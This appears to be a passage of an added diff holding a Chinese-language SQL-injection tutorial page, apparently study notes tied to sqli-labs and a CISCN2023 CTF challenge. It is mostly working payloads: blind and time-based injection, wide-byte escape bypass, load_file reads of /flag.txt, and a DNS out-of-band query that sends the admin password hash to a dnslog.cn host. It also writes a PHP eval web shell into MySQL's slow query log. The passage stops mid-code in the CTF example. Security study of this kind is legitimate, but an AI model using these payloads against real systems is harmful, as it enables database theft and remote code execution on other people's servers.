+<p>&#x5E76;&#x4E14;&#x5728;update&#x4E2D;&#x5F15;&#x7528;&#x4E86;<code>$row[&apos;address&apos;]</code>&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x5B58;&#x5728;&#x4E8C;&#x6B21;&#x6CE8;&#x5165;&#x3002;</p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5217;&#x540D;&#x4E3A;old_address&#xFF0C;&#x5728;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x65F6;&#xFF0C;&#x4F1A;&#x5C06;&#x65E7;&#x5730;&#x5740;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x8981;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x4FEE;&#x6539;&#x65F6;&#xFF0C;&#x5728;address&#x5904;&#x6CE8;&#x5165;&#x6076;&#x610F;&#x4EE3;&#x7801;&#xFF0C;&#x7B2C;&#x4E8C;&#x6B21;&#x4FEE;&#x6539;&#x67E5;&#x8BE2;&#x65E7;&#x5730;&#x5740;&#x65F6;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x3002;</p>
+<p>payload</p>
+<pre class="language-"><code class="lang-mysql">1&apos; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&apos;/flag.txt&apos;),1,20)),0x7e),1)#
+</code></pre>
+<h3 id="&#x76F2;&#x6CE8;--&#x65E0;&#x56DE;&#x663E;&#x6CE8;&#x5165;">&#x76F2;&#x6CE8;--&#x65E0;&#x56DE;&#x663E;&#x6CE8;&#x5165;</h3>
+<h4 id="&#x5E03;&#x5C14;&#x76F2;&#x6CE8;">&#x5E03;&#x5C14;&#x76F2;&#x6CE8;</h4>
+<p>&#x9875;&#x9762;&#x65E0;&#x6570;&#x636E;&#x56DE;&#x663E;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x4E24;&#x79CD;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#xFF0C;poc&#x5982;&#x4E0B;</p>
+<pre class="language-"><code class="lang-mysql">?id=1&apos; and 1=1 --+     # True
+?id=1&apos; and 1=2 --+     # False
+</code></pre>
+<p>payload</p>
+<pre class="language-"><code class="lang-mysql">?id=1&apos; and 1=&#x5B50;&#x67E5;&#x8BE2; --+  
+# &#x5B50;&#x67E5;&#x8BE2;=&#x5B57;&#x7B26;&#x4E32;&#x622A;&#x53D6;+&#x6BD4;&#x8F83;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">&#x903B;&#x8F91;&#x8FDE;&#x63A5;&#x7B26;</th>
+<th style="text-align:center">payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">&#x6216;</td>
+<td style="text-align:center">or &#xFF0C;\</td>
+<td>\</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">&#x5F02;&#x6216;</td>
+<td style="text-align:center">xor&#xFF0C;^</td>
+</tr>
+<tr>
+<td style="text-align:center">&#x6309;&#x4F4D;&#x4E0E;/&#x6216;</td>
+<td style="text-align:center">&amp;&#xFF0C;\</td>
+</tr>
+</tbody>
+</table>
+<p>&#x5B57;&#x7B26;&#x4E32;&#x622A;&#x53D6;</p>
+<pre class="language-"><code class="lang-mysql"># &#x4ECE;start&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;,&#x622A;&#x53D6;len&#x4E2A;&#x5B57;&#x7B26;
+substr(string,start,len)
+mid(string,start,len)
+
+# &#x4ECE;&#x5DE6;/&#x53F3;&#x622A;&#x53D6;len&#x4E2A;&#x5B57;&#x7B26;
+left(string,len)
+right(string,len)
+</code></pre>
+<p>&#x6BD4;&#x8F83;</p>
+<pre class="language-"><code class="lang-mysql">like binary 0x25{}{}25
+</code></pre>
+<p><img src="../../../../images/image-20230505230426015.png" alt="image-20230505230426015"></p>
+<blockquote>
+<p>&#x56E0;&#x4E3A;&#x5927;&#x5C0F;&#x5199;&#x4E0D;&#x654F;&#x611F;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x7528;<code>binary</code></p>
+<p>BINARY&#x5C06;16&#x8FDB;&#x5236;&#x8F6C;&#x5316;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;</p>
+</blockquote>
+<p>&#x8BED;&#x6CD5;</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">like</th>
+<th style="text-align:center">&#x6B63;&#x5219;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">_</td>
+<td style="text-align:center">.</td>
+</tr>
+<tr>
+<td style="text-align:center">%</td>
+<td style="text-align:center">.*</td>
+</tr>
+<tr>
+<td style="text-align:center">[]</td>
+<td style="text-align:center">[]</td>
+</tr>
+<tr>
+<td style="text-align:center"><sup><a href="#fn_" id="reffn_"></a></sup></td>
+<td style="text-align:center"><sup><a href="#fn_" id="reffn_"></a></sup></td>
+</tr>
+</tbody>
+</table>
+<pre class="language-"><code>regexp &quot;^a&quot;
+regexp &quot;^ab&quot;
+</code></pre><h4 id="&#x65F6;&#x95F4;&#x76F2;&#x6CE8;">&#x65F6;&#x95F4;&#x76F2;&#x6CE8;</h4>
+<p>&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x5C31;&#x662F;<strong>&#x5728;&#x5E03;&#x5C14;&#x76F2;&#x6CE8;&#x4E0A;&#x52A0;&#x4E86;&#x5EF6;&#x8FDF;&#x65F6;&#x95F4;&#x51FD;&#x6570;sleep()</strong>,&#x7528;&#x5728;True&#x548C;False&#x56DE;&#x663E;&#x96BE;&#x4EE5;&#x533A;&#x5206;&#x65F6;,&#x901A;&#x8FC7;&#x9875;&#x9762;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6765;&#x5224;&#x65AD;&#x5E03;&#x5C14;&#x903B;&#x8F91;&#x7684;&#x6B63;&#x786E;&#x4E0E;&#x5426;&#x3002;</p>
+<p><strong>payload</strong></p>
+<pre class="language-"><code class="lang-mysql">if(&#x5E03;&#x5C14;,A,B)&#x4E0E;&#x4E09;&#x76EE;&#x8FD0;&#x7B97;&#x7B26;&#x903B;&#x8F91;&#x4E00;&#x6837;,&#x52A0;&#x4E0A;sleep&#x51FD;&#x6570;
+
+sleep(if(&#x5E03;&#x5C14;,A,B))&#x5E03;&#x5C14;&#x6B63;&#x786E;,&#x5EF6;&#x8FDF;A&#x79D2;,&#x5E03;&#x5C14;&#x9519;&#x8BEF;,&#x5EF6;&#x8FDF;B&#x79D2;
+
+&#x6216;&#x8005; if(&#x5E03;&#x5C14;,1,sleep(x))&#x5E03;&#x5C14;&#x6B63;&#x786E;,&#x65E0;&#x5EF6;&#x8FDF;,&#x5E03;&#x5C14;&#x9519;&#x8BEF;,&#x5EF6;&#x8FDF;x&#x79D2;
+</code></pre>
+<p><img src="../../../../images/image-20230312232840696-1696561612774.png" alt="image-20230312232840696"></p>
+<p><strong>&#x5176;&#x4ED6;&#x80FD;&#x9020;&#x6210;&#x5EF6;&#x65F6;&#x6548;&#x679C;&#x7684;&#x8BED;&#x53E5;</strong></p>
+<pre class="language-"><code class="lang-mysql"># &#x901A;&#x8FC7;&#x6267;&#x884C;&#x591A;&#x6B21;&#x547D;&#x4EE4;&#x5F62;&#x6210;&#x5EF6;&#x65F6;
+benchmark(&#x6267;&#x884C;&#x6B21;&#x6570;,sql&#x8BED;&#x53E5;)
+
+# &#x67E5;&#x8BE2;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x91CF;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x8868;&#x505A;&#x7B1B;&#x5361;&#x5C14;&#x96C6;&#x8FD0;&#x7B97;&#xFF0C;&#x5BFC;&#x81F4;&#x67E5;&#x8BE2;&#x7F13;&#x6162;
+select * from tab1 cross join tab2;
+select * from tab1,tab2;
+</code></pre>
+<h3 id="dns&#x5916;&#x5E26;&#x6CE8;&#x5165;">DNS&#x5916;&#x5E26;&#x6CE8;&#x5165;</h3>
+<h5 id="&#x539F;&#x7406;">&#x539F;&#x7406;</h5>
+<ol>
+<li><p>MySQL Load_File()&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x4F7F;&#x7528;Dnslog&#x63A5;&#x6536;&#x8BF7;&#x6C42;&#xFF0C;&#x83B7;&#x53D6;&#x6570;&#x636E;&#xFF1B;</p>
+</li>
+<li><p>windows&#x4E0B;&#x5B58;&#x5728;<code>UNC&#x8DEF;&#x5F84;</code></p>
+<blockquote>
+<p>UNC&#x662F;&#x4E00;&#x79CD;&#x547D;&#x540D;&#x60EF;&#x4F8B;, &#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x5728;Microsoft Windows&#x4E0A;&#x6307;&#x5B9A;&#x548C;&#x6620;&#x5C04;&#x7F51;&#x7EDC;&#x9A71;&#x52A8;&#x5668;. UNC&#x547D;&#x540D;&#x60EF;&#x4F8B;&#x6700;&#x591A;&#x88AB;&#x5E94;&#x7528;&#x4E8E;&#x5728;&#x5C40;&#x57DF;&#x7F51;&#x4E2D;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x6216;&#x8005;&#x6253;&#x5370;&#x673A;&#x3002;</p>
+</blockquote>
+<pre class="language-"><code>\\xxxx\xx
+</code></pre><p>   <img src="../../../../images/image-20230425175525555.png" alt="image-20230425175525555"></p>
+<p>   <img src="../../../../images/image-20230425175452805.png" alt="image-20230425175452805"></p>
+</li>
+</ol>
+<h5 id="&#x4F7F;&#x7528;&#x6761;&#x4EF6;">&#x4F7F;&#x7528;&#x6761;&#x4EF6;</h5>
+<ul>
+<li>windows&#x7CFB;&#x7EDF;</li>
+<li><code>secure_file_priv</code>&#x4E3A;&#x7A7A;</li>
+</ul>
+<h5 id="payload">payload</h5>
+<pre class="language-"><code class="lang-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span>CONCAT<span class="token punctuation">(</span><span class="token string">&apos;\\\\&apos;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> hex<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">&apos;admin&apos;</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&apos;.mysql.2fzz61.dnslog.cn\\abc&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">-- Hex&#x7F16;&#x7801;&#x7684;&#x76EE;&#x7684;&#x662F;&#x51CF;&#x5C11;&#x5E72;&#x6270;&#xFF0C;&#x57DF;&#x540D;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x89C4;&#x8303;&#xFF0C;&#x6709;&#x4E9B;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x4E0D;&#x80FD;&#x5E26;&#x5165;</span>
+<span class="token comment">-- \\\\&#x8F6C;&#x4E49;  &#x2192;  \\</span>
+</code></pre>
+<h3 id="smb&#x5916;&#x5E26;&#x6CE8;&#x5165;">SMB&#x5916;&#x5E26;&#x6CE8;&#x5165;</h3>
+<p><a href="http://www.moonslow.com/article/smb_sql_injection" target="_blank">http://www.moonslow.com/article/smb_sql_injection</a></p>
+<h3 id="&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;">&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;</h3>
+<h5 id="&#x539F;&#x7406;">&#x539F;&#x7406;</h5>
+<p>&#x5BBD;&#x5B57;&#x8282;&#xFF1A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x7684;&#x5927;&#x5C0F;&#x662F;&#x4E24;&#x4E2A;&#x5B57;&#x8282;&#x7684;&#xFF0C;&#x8BE5;&#x5B57;&#x7B26;&#x79F0;&#x4E3A;&#x5BBD;&#x5B57;&#x8282;&#x5B57;&#x7B26;</p>
+<p><code>PHP</code>&#x4E0E;<code>Mysql</code>&#x4E4B;&#x95F4;&#x7684;&#x4EA4;&#x4E92;</p>
+<p><img src="../../../../images/5917903e25c36c63ec29ad5237c2f7a4.png" alt="img"></p>
+<p>&#x5C06;php&#x7684;sql&#x8BED;&#x53E5;&#x4EE5;<code>character_set_client</code>&#x7F16;&#x7801;&#xFF08;&#x4E5F;&#x5C31;&#x662F;&#x8F6C;&#x4E3A;16&#x8FDB;&#x5236;&#x6570;&#xFF09;&#xFF0C;&#x518D;&#x5C06;16&#x8FDB;&#x5236;&#x6570;&#x4EE5;<code>character_set_connection</code>&#x8FDB;&#x884C;&#x7F16;&#x7801;&#xFF08;&#x4E5F;&#x5C31;&#x662F;&#x8F6C;&#x6362;&#x4E3A;url&#x7F16;&#x7801;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x4EE5;&#x5185;&#x90E8;&#x64CD;&#x4F5C;&#x5B57;&#x7B26;&#x96C6;&#x8FDB;&#x884C;url&#x89E3;&#x7801;&#xFF0C;&#x6700;&#x540E;&#x4EE5;<code>character_set_results</code>&#x7F16;&#x7801;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x3002;</p>
+<pre class="language-"><code class="lang-php"><span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">27</span> &#x6D4F;&#x89C8;&#x5668;url&#x81EA;&#x52A8;&#x89E3;&#x7801;<span class="token operator">===</span><span class="token operator">&gt;</span> &#x3B2;<span class="token string single-quoted-string">&apos; &#x8F6C;&#x4E49;===&gt;&#x3B2;\&apos;&#x8F6C;&#x4E3A;16&#x8FDB;&#x5236;===&gt; 0xdf0x5c0x27 &#x8F6C;&#x6362;&#x4E3A;url&#x7F16;&#x7801;===&gt; %df%5c%27 &#x8FDB;&#x884C;url&#x89E3;&#x7801;(&#x56E0;&#x4E3A;&#x662F;GBK&#x7F16;&#x7801;&#xFF0C;%df&#x548C;%5c&#x7ED3;&#x5408;&#x4E3A;&#x6C49;&#x5B57;)===&gt; &#x904B;&apos;</span>
+</code></pre>
+<p>&#x7B80;&#x5355;&#x7684;&#x8BF4;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x5BBD;&#x5B57;&#x8282;&#x5403;&#x6389;&#x8F6C;&#x4E49;&#x7B26;&#xFF0C;&#x9003;&#x9038;&#x51FA;&#x5355;&#x5F15;&#x53F7;&#x6765;&#x8FDB;&#x884C;&#x95ED;&#x5408;</p>
+<h5 id="&#x4F8B;&#x9898;">&#x4F8B;&#x9898;</h5>
+<p><code>sql-lab less-32</code></p>
+<p>&#x8F6C;&#x4E49;&#x5B57;&#x7B26;</p>
+<p><img src="../../../../images/image-20230522170722857.png" alt="image-20230522170722857"></p>
+<p>&#x8BBE;&#x7F6E;&#x7F16;&#x7801;&#x96C6;</p>
+<p><img src="../../../../images/image-20230522170750335.png" alt="image-20230522170750335"></p>
+<p>sql&#x8BED;&#x53E5;&#xFF0C;&#x5355;&#x5F15;&#x53F7;&#x95ED;&#x5408;</p>
+<p><img src="../../../../images/image-20230522171701503.png" alt="image-20230522171701503"></p>
+<pre class="language-"><code class="lang-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span>
+</code></pre>
+<p><img src="../../../../images/image-20230522171728569.png" alt="image-20230522171728569"></p>
+<pre class="language-"><code class="lang-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">27</span>
+</code></pre>
+<p><img src="../../../../images/image-20230522171841053.png" alt="image-20230522171841053"></p>
+<h5 id="payload">payload</h5>
+<pre class="language-"><code class="lang-mysql">?id=1%df&apos;
+</code></pre>
+<p>&#x4F7F;&#x7528; Linux &#x81EA;&#x5E26;&#x7684; iconv &#x547D;&#x4EE4;&#x8FDB;&#x884C; UTF &#x7684;&#x7F16;&#x7801;&#x8F6C;&#x6362;</p>
+<pre class="language-"><code class="lang-shell"><span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>&apos;<span class="token operator">|</span><span class="token function">iconv</span> <span class="token parameter variable">-f</span> utf-8 <span class="token parameter variable">-t</span> utf-16
+<span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>&apos;<span class="token operator">|</span><span class="token function">iconv</span> <span class="token parameter variable">-f</span> utf-8 <span class="token parameter variable">-t</span> utf-32
+</code></pre>
+<p><img src="../../../../images/image-20230523121013028.png" alt="image-20230523121013028"></p>
+<pre class="language-"><code class="lang-mysql">?id=1&#xFFFD;&apos;
+</code></pre>
+<p><img src="../../../../images/image-20230523121159948.png" alt="image-20230523121159948"></p>
+<h3 id="order-by-&#x6CE8;&#x5165;">order by &#x6CE8;&#x5165;</h3>
+<p><a href="https://www.cnblogs.com/1ink/p/15107674.html" target="_blank">https://www.cnblogs.com/1ink/p/15107674.html</a></p>
+<ul>
+<li><p>&#x77E5;&#x9053;&#x5217;&#x540D;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#x4F7F;&#x7528;</p>
+<pre class="language-"><code>?order=if(&#x8868;&#x8FBE;&#x5F0F;,id,username)
+</code></pre></li>
+<li><p>&#x4E0D;&#x77E5;&#x9053;&#x5217;&#x540D;</p>
+<pre class="language-"><code>?order=if(&#x8868;&#x8FBE;&#x5F0F;,1,(select id from information_schema.tables))
+</code></pre></li>
+</ul>
+<h3 id="getshell">Getshell</h3>
+<h5 id="&#x5199;&#x6587;&#x4EF6;">&#x5199;&#x6587;&#x4EF6;</h5>
+<h6 id="&#x6761;&#x4EF6;">&#x6761;&#x4EF6;</h6>
+<ul>
+<li><p>&#x9AD8;&#x6743;&#x9650;</p>
+<pre class="language-"><code class="lang-mysql">select user, file_priv from mysql.user;
+</code></pre>
+<p><img src="../../../../images/image-20230528210141344.png" alt="image-20230528210141344"></p>
+</li>
+<li><p>&#x77E5;&#x9053;&#x7F51;&#x7AD9;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</p>
+</li>
+<li><p><code>secure_fil_priv</code></p>
+<pre class="language-"><code class="lang-mysql">select @@secure_file_priv;
+show global variables like &apos;%secure_file_priv%&apos;; # show&#x8BED;&#x53E5;&#x8981;&#x5806;&#x53E0;&#x6CE8;&#x5165;&#x548C;&#x56DE;&#x663E;
+</code></pre>
+</li>
+</ul>
+<p><img src="../../../../images/image-20230522174929267.png" alt="image-20230522174929267"></p>
+<h6 id="payload">payload</h6>
+<p><strong>&#x57FA;&#x4E8E;&#x8054;&#x5408;&#x67E5;&#x8BE2;</strong></p>
+<pre class="language-"><code class="lang-mysql">select *from users where id=1 union select 1,&apos;<span class="token prolog">&lt;?php phpinfo();?&gt;</span>&apos;,3 into outfile &apos;C:\info.php&apos;;
+
+select *from users where id=1 union select 1,&apos;<span class="token prolog">&lt;?php phpinfo();?&gt;</span>&apos;,3 into  dumpfile &apos;C:\info2.php&apos;;
+</code></pre>
+<p><code>outfile</code>&#x548C;<code>dumpfile</code>&#x7684;&#x533A;&#x522B;</p>
+<ul>
+<li><code>outfile</code>&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x652F;&#x6301;&#x591A;&#x884C;&#xFF0C;<code>dumpfile</code>&#x53EA;&#x652F;&#x6301;&#x4E00;&#x884C;</li>
+<li><code>outfile</code>&#x4F1A;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;<code>dumpfile</code>&#x4E0D;&#x4F1A;</li>
+</ul>
+<p>&#x6240;&#x4EE5;&#x4F7F;&#x7528;<code>into dumpfile</code>&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x6765;&#x5199;&#x5165;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;</p>
+<p><img src="../../../../images/image-20230522180009679.png" alt="image-20230522180009679"></p>
+<p><strong>&#x975E;&#x8054;&#x5408;&#x67E5;&#x8BE2;</strong></p>
+<pre class="language-"><code class="lang-mysql">select *from users where id=1 into outfile &apos;C:\info.php&apos; fields terminated by &apos;<span class="token prolog">&lt;?php phpinfo();?&gt;</span>&apos;;
+
+select *from users where id=1 into outfile &apos;C:\info2.php&apos; lines terminated by &apos;<span class="token prolog">&lt;?php phpinfo();?&gt;</span>&apos;;
+</code></pre>
+<p><img src="../../../../images/image-20230522180543767.png" alt="image-20230522180543767"></p>
+<h5 id="&#x5199;&#x5165;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;">&#x5199;&#x5165;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</h5>
+<pre class="language-"><code class="lang-mysql"># --&#x67E5;&#x770B;&#x914D;&#x7F6E;&#xFF0C;&#x65E5;&#x5FD7;&#x662F;&#x5426;&#x5F00;&#x542F;&#xFF0C;&#x548C;mysql&#x9ED8;&#x8BA4;log&#x5730;&#x5740;(&#x8BB0;&#x4E0B;&#x539F;&#x5730;&#x5740;&#x65B9;&#x4FBF;&#x6062;&#x590D;)
+show variables like &apos;%general%&apos;;
+
+set global general_log = on;
+
+set global general_log_file = &apos;e:\info.php&apos;; # &#x8FD9;&#x91CC;&#x65E5;&#x5FD7;&#x521B;&#x5EFA;&#x6743;&#x9650;&#x8981;&#x4F4E;&#x4E00;&#x4E9B;&#xFF0C;&#x4E0D;&#x80FD;&#x5728;c&#x76D8;&#x521B;&#x5EFA;
+
+select &apos;<span class="token prolog">&lt;?php phpinfo();?&gt;</span>&apos;;
+
+--&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x75D5;&#x8FF9;&#x6E05;&#x7406;
+</code></pre>
+<p>&#x65E5;&#x5FD7;&#x6162;&#x67E5;&#x8BE2;</p>
+<p>From&#xFF1A;<a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html" target="_blank">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></p>
+<blockquote>
+<p>&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x6162;&#x67E5;&#x8BE2;&#x5199;&#x5462;&#xFF1F;&#x56E0;&#x4E3A;&#x5F00;&#x542F;&#x65E5;&#x5FD7;&#x76D1;&#x6D4B;&#x540E;&#x6587;&#x4EF6;&#x4F1A;&#x5F88;&#x5927;&#xFF0C;&#x7F51;&#x7AD9;&#x8BBF;&#x95EE;&#x91CF;&#x5927;&#x7684;&#x8BDD;&#x6211;&#x4EEC;&#x5199;&#x7684;shell&#x4F1A;&#x51FA;&#x9519;</p>
+</blockquote>
+<pre class="language-"><code class="lang-mysql">show variables like &apos;%slow_query_log%&apos;;        --&#x67E5;&#x770B;&#x6162;&#x67E5;&#x8BE2;&#x4FE1;&#x606F;
+set global slow_query_log=1;                --&#x542F;&#x7528;&#x6162;&#x67E5;&#x8BE2;&#x65E5;&#x5FD7;(&#x9ED8;&#x8BA4;&#x7981;&#x7528;)
+set global slow_query_log_file=&apos;C:\\phpStudy\\WWW\\shell.php&apos;;    --&#x4FEE;&#x6539;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;
+
+show global variables like &apos;%long_query_time%&apos;;
+--&#x67E5;&#x770B;&#x9ED8;&#x8BA4;&#x65F6;&#x95F4;&#x503C;&#xFF0C;&#x5F53;sql&#x8BED;&#x53E5;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8D85;&#x8FC7;&#x8BE5;&#x503C;&#x624D;&#x4F1A;&#x88AB;&#x8BA1;&#x5165;&#x65E5;&#x5FD7;&#x4E2D;&#xFF0C;&#x9ED8;&#x8BA4;10&#x79D2;
+
+select &apos;<span class="token prolog">&lt;?php @eval($_POST[abc]);?&gt;</span>&apos; or sleep(@@long_query_time+1);    --&#x5199;shell&#x5230;&#x6162;&#x67E5;&#x8BE2;&#x65E5;&#x5FD7;
+</code></pre>
+<p><img src="../../../../images/image-20230522182142555.png" alt="image-20230522182142555"></p>
+<h5 id="sqlmap----os-shell">sqlmap  --os-shell</h5>
+<ul>
+<li><p>&#x5927;&#x81F4;&#x6D41;&#x7A0B;</p>
+<pre class="language-"><code>&#x83B7;&#x53D6;&#x76EE;&#x6807;&#x4FE1;&#x606F;&#x2192;&#x4F7F;&#x7528;lines terminated by&#x5C06;&#x5177;&#x6709;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x1F40E;&#x4E0A;&#x4F20;&#x5230;&#x7F51;&#x7AD9;&#x2192;&#x9010;&#x7EA7;&#x76EE;&#x5F55;&#x8BBF;&#x95EE;&#x627E;&#x5230;&#x1F40E;
+
+&#x2192;&#x901A;&#x8FC7;&#x8BE5;&#x1F40E;&#x4E0A;&#x4F20;&#x771F;&#x6B63;&#x7684;&#x547D;&#x4EE4;&#x1F40E;&#x2192;&#x6D4B;&#x8BD5;&#x547D;&#x4EE4;&#x1F40E;&#x80FD;&#x5426;&#x6267;&#x884C;&#x2192;&#x5220;&#x9664;&#x4E0A;&#x4F20;&#x7684;&#x4E24;&#x4E2A;&#x1F40E;
+</code></pre></li>
+<li><p>&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x1F40E;&#xFF1A;form&#x8868;&#x5355;</p>
+</li>
+</ul>
+<ul>
+<li>php&#x547D;&#x4EE4;&#x9A6C;&#xFF1A;&#x83B7;&#x5F97;<code>disable_function</code>&#xFF0C;&#x904D;&#x5386;&#x6240;&#x6709;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x51FD;&#x6570;&#xFF0C;&#x5224;&#x65AD;&#x54EA;&#x4E00;&#x4E2A;&#x4E0D;&#x5728;<code>disable_function</code>&#x3002;</li>
+</ul>
+<h3 id="&#x8BFB;&#x53D6;&#x6587;&#x4EF6;">&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</h3>
+<h5 id="loadfile"><code>load_file</code></h5>
+<p><strong>&#x6CE8;&#x610F;&#xFF1A;&#x8F6C;&#x4E49;&#x5B57;&#x7B26;</strong></p>
+<pre class="language-"><code class="lang-mysql">select load_file(&apos;e:\test.txt&apos;); # \t &#x9519;&#x8BEF;&#x8DEF;&#x5F84;
+select load_file(&apos;e:\\test.txt&apos;);# &#x6B63;&#x786E;
+select load_file(0x653A5C746573742E747874);# &#x652F;&#x6301;&#x5341;&#x516D;&#x8FDB;&#x5236;
+select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# &#x652F;&#x6301;char&#x51FD;&#x6570;
+</code></pre>
+<p><img src="../../../../images/image-20230523134023401.png" alt="image-20230523134023401"></p>
+<h5 id="load-data"><code>load data</code></h5>
+<pre class="language-"><code class="lang-mysql">create table user(cmd text)
+load data infile &apos;e:/test.txt&apos; into table user;
+select * from user;
+</code></pre>
+<p><img src="../../../../images/image-20230523134532606.png" alt="image-20230523134532606"></p>
+<p><img src="../../../../images/image-20230522220456619.png" alt="image-20230522220456619"></p>
+<h3 id="mysqldump--&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x51FA;&#x65F6;&#x7684;rce">mysqldump--&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x51FA;&#x65F6;&#x7684;RCE</h3>
+<p><strong>shell</strong>&#x4E0B;&#x6267;&#x884C;</p>
+<pre class="language-"><code class="lang-shell">mysqldump <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-proot</span> --all-databases <span class="token operator">&gt;</span> file_path  <span class="token comment"># &#x5BFC;&#x51FA;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;</span>
+mysqldump <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-proot</span> <span class="token parameter variable">--databases</span> db1 <span class="token parameter variable">--tables</span> a1 a2  <span class="token operator">&gt;</span> /file_path <span class="token comment"># &#x5BFC;&#x51FA;db1&#x4E2D;&#x7684;a1&#x3001;a2&#x8868;</span>
+</code></pre>
+<p>&#x5BFC;&#x51FA;&#x7684;&#x6587;&#x672C;&#x5185;&#x5BB9;</p>
+<pre class="language-"><code>&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x5224;&#x65AD;&#x8BED;&#x53E5;-&#x5220;&#x9664;&#x8868;-&#x521B;&#x5EFA;&#x8868;-&#x9501;&#x8868;-&#x7981;&#x7528;&#x7D22;&#x5F15;-&#x63D2;&#x5165;&#x6570;&#x636E;-&#x542F;&#x7528;&#x7D22;&#x5F15;-&#x89E3;&#x9501;&#x8868;
+</code></pre><p><img src="../../../../images/image-20230528204837541.png" alt="image-20230528204837541"></p>
+<p><strong>&#x4F8B;&#x9898;</strong></p>
+<p>CISCN2023&#x521D;&#x8D5B;--dumpit</p>
+<p>&#x5173;&#x952E;&#x4EE3;&#x7801;</p>
+<pre class="language-"><code class="lang-php"><span class="token variable">$black</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&apos;;`*#^$&amp;|&apos;</span><span class="token punctuation">;</span>  <span class="token comment">#&#x9ED1;&#x540D;&#x5355;</span>
+
+<span class="token variable">$db</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;db&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$t2d</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;table_2_dump&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$randstr</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
